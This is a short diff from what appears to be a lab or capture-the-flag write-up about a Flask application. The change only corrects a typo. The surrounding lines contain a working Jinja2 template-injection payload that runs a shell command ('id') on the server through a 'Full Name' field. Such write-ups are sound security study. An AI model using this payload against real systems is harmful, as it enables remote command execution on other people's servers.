@@ -41,7 +41,7 @@ superadministrator
 Flask application and SSTI in the Full Name field
 ![image](https://user-images.githubusercontent.com/87831546/142666543-8ccb3f45-0888-4244-a549-2cfcd97ec2a0.png)
 
-Command execution throuhg SSTI:
+Command execution through SSTI:
 ```
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
 ```
